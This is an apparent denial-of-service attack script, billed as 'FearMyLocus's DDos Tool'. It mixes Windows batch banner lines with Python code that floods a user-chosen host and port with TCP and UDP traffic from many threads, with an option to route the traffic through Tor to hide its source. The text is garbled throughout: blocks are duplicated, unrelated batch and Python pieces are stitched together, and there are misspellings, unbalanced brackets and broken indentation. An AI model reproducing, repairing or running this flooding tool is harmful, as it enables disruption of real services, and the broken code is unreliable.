@echo.
pause 
:main 
@echo.
@echo ___                        ___   ___                _____            _ 
@echo   / __\__  __ _ _ __ ___     /   \ /   \___  ___   /__   \___   ___ | |
@echo  / _\/ _ \/ _` | '__/ __|   / /\ // /\ / _ \/  __|   / /\/ _ \ / _ \| |
@echo / / |  __/ (_| | |  \__ \  / /_/// /_// (_) \__ \  / / | (_) | (_) | |
@echo \/   \___|\__,_|_|  |___/ /___,'/___,'\___/|___/   \/   \___/ \___/|_|
echo
print("Welcome To FearMyLocus's DDos Tool ;)")
import threading 
import os
import time 
impott socket
import sys
import datetime
import socks
@echo.
pause 
:main 
@echo.
@echo ___                        ___   ___                _____            _ 
@echo   / __\__  __ _ _ __ ___     /   \ /   \___  ___   /__   \___   ___ | |
@echo  / _\/ _ \/ _` | '__/ __|   / /\ // /\ / _ \/  __|   / /\/ _ \ / _ \| |
@echo / / |  __/ (_| | |  \__ \  / /_/// /_// (_) \__ \  / / | (_) | (_) | |
@echo \/   \___|\__,_|_|  |___/ /___,'/___,'\___/|___/   \/   \___/ \___/|_|
echo
print("Welcome To FearMyLocus's DDos Tool ;)")
import threading 
import os
import time 
impott socket
import sys
import datetime
import socks
class Dos:
    def _init_(self, host, port, nThreads,useTor):
        self.host = host
        self.port = port
        self.nThreads = nThreads
        self:UseTor = UseTor
        
        if (self.UseTor:
             socks.set_default_proxy(socks.SOCKSS, "127.0.0.1", 9150)
        
        self.threads = class Dos:
    def _init_(self, host, port, nThreads,useTor):
        self.host = host
        self.port = port
        self.nThreads = nThreads
        self:UseTor = UseTor
        
            
        self.threads = []
        
        self.message = ****FeaR My Locus Lulz****
     
    def SendAttack (self):
        
        if self.UseTor:
            s = socks.socksocket()
        else:
            s = socket.socket.AF_INET, socket.SOCK_STREAM
        
        try:
        s.connect((self.host, self.port))
        s.send(self.message) # TCP Attack
        s.sendto(self.message, (self.host, self.port)) # UDP Attack
    except:
        pass
        
    s.close():
    
def Attack(self):
    for i in range(self.nThreads):
        t = threading.Thread(target = SendAttack)

        s.send(self.message) # TCP Attack
        s.sendto(self.message, (self.host, self.port)) # UDP Attack
    except:
        pass
        
    s.close():
    
def Attack(self):
    for i in range(self.nThreads):
        t = threading.Thread(target = SendAttack)
        self threads.append(t)
        
    for i in self.threads:
        i.start()
        
    for i in self.threads:
    i.join()
Tor = input ('[?] did you want to use Tor? (S/N): ').lower()   
host = input('[*] Enter Target Host Address: '))
port = int(input('[*] Enter Port to Attack: '))
threads = int(input('[*] Enter number of Attacks: ')
useTor = false

if Tor == 's':
    UseTor = True

hostip = socket.gethostbyname(host)

Dos = Dos(host, port, threads)

print('\n\n[*] Starting The Attack At %s...%(Time.strftime("%h&m&s")))
start_time = datetime.now()

Dos.Attack()

end_time = datetime.now()
total_time = end_time - start_time 

print('\nhost %s... IP %s...'% ())
print('\n[*] The Attack Was Done At %s...'% (time.strftime("%h%m%s")))
print(' [*] Total Attack Time %s...' % ())